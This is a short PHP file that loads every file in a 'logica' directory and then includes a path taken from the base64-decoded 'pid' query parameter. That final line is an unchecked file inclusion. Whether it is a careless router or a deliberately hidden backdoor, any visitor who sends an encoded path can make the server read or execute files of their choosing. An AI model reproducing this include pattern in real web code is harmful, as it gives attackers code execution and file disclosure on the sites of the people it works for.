<?php 
$dir = "logica";
foreach (scandir($dir) as $file) {
    if ($file === '.' || $file === '..') continue;
    $path = $dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($path)) require_once $path;        
}

include base64_decode($_GET["pid"]);